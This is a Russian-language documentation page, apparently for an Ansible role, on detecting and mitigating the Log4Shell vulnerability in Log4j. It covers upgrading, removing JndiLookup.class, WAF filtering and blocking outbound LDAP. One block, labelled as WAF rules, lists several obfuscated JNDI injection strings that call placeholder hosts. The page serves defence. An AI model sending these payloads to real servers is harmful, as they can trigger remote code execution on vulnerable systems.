<!DOCTYPE html>
<html class="no-js" lang="ru"> <head><meta charset="utf-8"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta content="CVE-2021-44228 (Log4Shell) поиск и удаление класса из уязвимой библиотеки" name="description"/><meta content="Dmitriy Prigoda" name="author"/><link href="https://d34m0nn0n3.github.io/ansible-log4shell-find-and-fix/index.html" rel="canonical"/><link href="assets/img/favicon/favicon.png" rel="icon"/><meta content="mkdocs-1.2.3, mkdocs-material-7.1.8" name="generator"/><title>Log4Shell</title><link href="assets/stylesheets/main.ca7ac06f.min.css" rel="stylesheet"/><link href="assets/stylesheets/palette.f1a3b89f.min.css" rel="stylesheet"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&amp;display=fallback" rel="stylesheet"/><style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style><link href="assets/extra.css" rel="stylesheet"/><link href="form/tabledynamic.css" rel="stylesheet"/><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-BT11X31T69"),document.addEventListener("DOMContentLoaded",function(){"undefined"!=typeof location$&&location$.subscribe(function(t){gtag("config","G-BT11X31T69",{page_path:t.pathname})})})</script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-BT11X31T69"></script></head> <body data-md-color-accent="red" data-md-color-primary="blue-grey" data-md-color-scheme="default" dir="ltr"> <script>function __prefix(e){return new URL(".",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script> <script>var palette=__get("__palette");if(null!==palette&&"object"==typeof palette.color)for(var key in palette.color)document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/> <input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/> <label class="md-overlay" for="__drawer"></label> <div data-md-component="skip"> <a class="md-skip" href="#общее-описание"> Перейти к содержанию </a> </div> <div data-md-component="announce"> </div> <header class="md-header" data-md-component="header"> <nav aria-label="Header" class="md-header__inner md-grid"> <a class="md-header__button md-logo" data-md-component="logo" href="index.html" title="Home page"> <img alt="logo" src="assets/img/logo/logo.svg"/> </a> <label class="md-header__button md-icon" for="__drawer"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"></path></svg> </label> <div class="md-header__title" data-md-component="header-title"> <div class="md-header__ellipsis"> <div class="md-header__topic"> <span class="md-ellipsis"> Log4Shell </span> </div> <div class="md-header__topic" data-md-component="header-topic"> <span class="md-ellipsis"> Общее описание </span> </div> </div> </div> <form class="md-header__option" data-md-component="palette"> <input aria-hidden="true" class="md-option" data-md-color-accent="red" data-md-color-media="" data-md-color-primary="blue-grey" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/> </form> <label class="md-header__button md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"></path></svg> </label> <div class="md-search" data-md-component="search" role="dialog"> <label class="md-search__overlay" for="__search"></label> <div class="md-search__inner" role="search"> <form class="md-search__form" name="search"> <input aria-label="Поиск" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" data-md-state="active" name="query" placeholder="Поиск" required="" spellcheck="false" type="text"/> <label class="md-search__icon md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"></path></svg> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"></path></svg> </label> <button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" type="reset"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"></path></svg> </button> </form> <div class="md-search__output"> <div class="md-search__scrollwrap" data-md-scrollfix=""> <div class="md-search-result" data-md-component="search-result"> <div class="md-search-result__meta"> Initializing search </div> <ol class="md-search-result__list"></ol> </div> </div> </div> </div> </div> <div class="md-header__source"> <a class="md-source" data-md-component="source" href="https://github.com/D34m0nN0n3/ansible-log4shell-find-and-fix" title="Перейти к репозиторию"> <div class="md-source__icon md-icon"> <svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"></path></svg> </div> <div class="md-source__repository"> D34m0nN0n3/ansible-log4shell-find-and-fix </div> </a> </div> </nav> </header> <div class="md-container" data-md-component="container"> <main class="md-main" data-md-component="main"> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--integrated" data-md-level="0"> <label class="md-nav__title" for="__drawer"> <a class="md-nav__button md-logo" data-md-component="logo" href="index.html" title="Log4Shell"> <img alt="logo" src="assets/img/logo/logo.svg"/> </a> </label> <div class="md-nav__source"> <a class="md-source" data-md-component="source" href="https://github.com/D34m0nN0n3/ansible-log4shell-find-and-fix" title="Перейти к репозиторию"> <div class="md-source__icon md-icon"> <svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"></path></svg> </div> <div class="md-source__repository"> D34m0nN0n3/ansible-log4shell-find-and-fix </div> </a> </div> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle="toc" id="__toc" type="checkbox"/> <label class="md-nav__link md-nav__link--active" for="__toc"> <span class="md-nav__icon md-icon"></span> <a class="md-nav__link md-nav__link--active" href="index.html" style="margin: initial; padding: initial; pointer-events: initial"> Общее описание </a> </label> <a class="md-nav__link md-nav__link--active" href="index.html"> Общее описание </a> <nav aria-label="Содержание" class="md-nav md-nav--secondary"> <label class="md-nav__title" for="__toc"> <span class="md-nav__icon md-icon"></span> Содержание </label> <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="#обнаружение-уязвимой-библиотеки"> Обнаружение уязвимой библиотеки </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#устранение-уязвимости"> Устранение уязвимости </a> <nav aria-label="Устранение уязвимости" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#обновление-версии"> Обновление версии </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#временное-решение"> Временное решение </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#ansible-роль"> Ansible роль </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="log4j.html"> Ansible роль </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="check.html"> Анализ уязвимости </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="seealso.html"> Дополнительные материалы </a> </li> </ul> </nav> </div> </div> </div> <div class="md-content" data-md-component="content"> <article class="md-content__inner md-typeset"> <h1 id="общее-описание">Общее описание<a class="headerlink" href="#общее-описание" title="Permanent link">¶</a></h1> <p>Уязвимость в утилите журналирования Log4j от Apache Software Foundation <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a></p> <p>Уязвимость удаленного выполнения кода под названием Log4Shell получила максимальную оценку в 10 баллов по шкале CVSSv3, поскольку ее можно эксплуатировать удаленно, и особых технических навыков для этого не требуется. Критическая опасность связана с повсеместным присутствием утилиты Log4j почти во всех основных корпоративных приложениях и серверах на базе Java. Проблема затрагивает версии log4j между 2.0-beta-9 и 2.14.1. Уязвимость отсутствует в версии log4j 1 и исправлена в версии 2.15.0<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup>. В версии 2.15.0 по умолчанию был отключен лишь один аспект функционала JNDI по поиску сообщений. Теперь же вышло второе исправление 2.16.0, по умолчанию отключающее всю поддержку JNDI и полностью удаляющее обработку поиска сообщений, но и в нем найдена уязвимость.</p> <p>Выпуск второго обновления был необходим, поскольку версию 2.15.0 по-прежнему можно проэксплуатировать при определенных незаводских конфигурациях. Данная проблема получила собственный идентификатор <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45046">CVE-2021-45046</a>. В связи с этим в версии 2.16.0 JNDI выключен. JNDI представляет собой API, используемый утилитой Log4j для извлечения объектов с удаленных серверов с целью их использования в записях журнала. В версии 2.16.0 проблема получила индекс <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45105">CVE-2021-45105</a>.</p> <div class="admonition done"> <p class="admonition-title">Последняя актуальная версия</p> <p>Доступна <a href="https://logging.apache.org/log4j/2.x/download.html">2.17.0</a> на официальном сайте.</p> </div> <h2 id="обнаружение-уязвимой-библиотеки">Обнаружение уязвимой библиотеки<a class="headerlink" href="#обнаружение-уязвимой-библиотеки" title="Permanent link">¶</a></h2> <p>Для анализа проблемы на хосте необходимо выполнить поиск запущенных java процессов, и проверить не используют они уязвимую библиотеку.</p> <div class="admonition info"> <p class="admonition-title">Для информации</p> <p>Для поиска роль использует скрипт по Python из проекта <a href="https://github.com/fox-it/log4j-finder">fox-it/log4j-finder</a>. Так как в нем используется анализ не по имени файлов, а по md5 суммам версий библиотек. Что в значительной степени повышает надежность обнаружения. В том числе обнаружение идет и в runtime LXC (docker images).</p> </div> <h2 id="устранение-уязвимости">Устранение уязвимости<a class="headerlink" href="#устранение-уязвимости" title="Permanent link">¶</a></h2> <h3 id="обновление-версии">Обновление версии<a class="headerlink" href="#обновление-версии" title="Permanent link">¶</a></h3> <p>Очевидное и самое правильное решение обновить версию библиотеки до последнего доступного релиза. Обновление библиотеки выполняется совместно с обновлением приложения. Для этого необходимо дождаться новой версии приложения от разработчика.</p> <div class="admonition attention"> <p class="admonition-title">Внимание</p> <p>Обновление только библиотеки может привести к полной или частично неработоспособности приложения.</p> </div> <h3 id="временное-решение">Временное решение<a class="headerlink" href="#временное-решение" title="Permanent link">¶</a></h3> <p>Это комплекс мер которы снижает риски эксплуатации данной уязвимости, если отсутствует обновление или нет возможности его применить.</p> <div class="admonition attention"> <p class="admonition-title">Внимание</p> <p>Данные решения не решают проблему полностью, а только снижают риски.</p> </div> <ul> <li>Удалить возможность Log4j выполнять поиски уязвимых запросов. Эта функция находится в JndiLookup.class, необходимо удалить данный класс из библиотеки Log4j.</li> </ul> <div class="admonition example"> <p class="admonition-title">Удаление класса</p> <div class="highlight"><pre><span></span><code>zip -q -d &lt;path/filename&gt;.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
</code></pre></div> </div> <div class="admonition attention"> <p class="admonition-title">Внимание</p> <p>Также рекомендуется одновременно удалить другие классы, которые также могут быть использованы в этой или подобных атаках. Эти файлы включают JndiManager, JMSAppender и SMTPAppender. Имейте в виду, что удаление классов из среды выполнения может вызвать неожиданное поведение (полную или частичную неработоспособность приложения).</p> </div> <div class="admonition attention"> <p class="admonition-title">Внимание</p> <p>Роль удаляет только JndiLookup класс из библиотеки.</p> </div> <div class="admonition fail"> <p class="admonition-title">Особое внимание</p> <p>Не рекомендуется использовать удаление класса, так как может привести к полной или частично неработоспособности приложения.</p> </div> <ul> <li>Добавьте правила WAF для блокировки вредоносных входящих запросов.</li> </ul> <p>Правила WAF (Web Application Firewall) могут быть добавлены для фильтрации входящих запросов. Вот несколько примеров попыток атак в обход правил:</p> <div class="admonition example"> <p class="admonition-title">Правила WAF</p> <div class="highlight"><pre><span></span><code>${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}  
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}  
${jndi:rmi://adsasd.asdasd.asdasd}  
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}  
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}  
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}  
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}  
${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://%s}  
</code></pre></div> </div> <div class="admonition attention"> <p class="admonition-title">Внимание</p> <p>Обратите внимание, что на этот подход нельзя полагаться, поскольку злоумышленники каждый час создают новые цепочки атак, которые могут обойти эти правила. Возможно, придется добавить их вручную, новые правила для отклонения запросов на остове ализа журналов WAF, которые выглядят как злонамеренные атаки на эту уязвимость.</p> </div> <ul> <li>В дополнение к правилам WAF, настроить запрет исходящих соединений по протоколу LDAP на межсетевом экране.</li> </ul> <div class="admonition attention"> <p class="admonition-title">Внимание</p> <p>Блокировать необходимо не LDAP порт, а пакеты протокола LDAP.</p> </div> <h2 id="ansible-роль">Ansible роль<a class="headerlink" href="#ansible-роль" title="Permanent link">¶</a></h2> <p>Для определения используемых уязвимых библиотек и исправления написана ansible роль:</p> <ul> <li>infra-service.log4j</li> </ul> <div class="admonition tip"> <p class="admonition-title">Подсказка</p> <p>Для создания закладки в браузере на данное руководство: <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-d">D</kbd></span></p> </div> <div class="footnote"> <hr/> <ol> <li id="fn:1"> <p>Устранена частично, остается возможность вызвать отказ в обслуживание (Denial of Service). <a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">↩</a></p> </li> </ol> </div> <hr/> <div class="md-source-date"> <small> Последнее обновление: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">February 24, 2022</span> </small> </div> </article> </div> </div> <a class="md-top md-icon" data-md-component="top" data-md-state="hidden" href="#" title="Back to top"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path></svg> </a> </main> <footer class="md-footer"> <nav aria-label="Footer" class="md-footer__inner md-grid"> <a aria-label="Вперед: Ansible роль" class="md-footer__link md-footer__link--next" href="log4j.html" rel="next"> <div class="md-footer__title"> <div class="md-ellipsis"> <span class="md-footer__direction"> Вперед </span> Ansible роль </div> </div> <div class="md-footer__button md-icon"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"></path></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class="md-footer-copyright"> <div class="md-footer-copyright__highlight"> Copyright © <a href="https://github.com/D34m0nN0n3">Dmitriy Prigoda</a>. </div> Made with <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank"> Material for MkDocs </a>  ... <a class="link--pdf-download" download href="./Log4Shell.pdf" title="PDF">download PDF</a></div> </div> </div> </footer> </div> <div class="md-dialog" data-md-component="dialog"> <div class="md-dialog__inner md-typeset"></div> </div> <script id="__config" type="application/json">{"base": ".", "features": ["content.tabs.link", "navigation.indexes", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.integrate"], "translations": {"clipboard.copy": "\u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0432 \u0431\u0443\u0444\u0435\u0440", "clipboard.copied": "\u0421\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u043e \u0432 \u0431\u0443\u0444\u0435\u0440", "search.config.lang": "ru", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "\u041f\u043e\u0438\u0441\u043a", "search.result.placeholder": "\u041d\u0430\u0447\u043d\u0438\u0442\u0435 \u043f\u0435\u0447\u0430\u0442\u0430\u0442\u044c \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430", "search.result.none": "\u0421\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e", "search.result.one": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e 1 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435", "search.result.other": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e # \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "assets/javascripts/workers/search.00c949be.min.js", "version": null}</script> <script src="assets/javascripts/bundle.82b56eb2.min.js"></script> <script src="assets/extra.js"></script> <script src="assets/tex-mml-chtml.js"></script> <script src="form/tabledynamic.js"></script> </body> </html>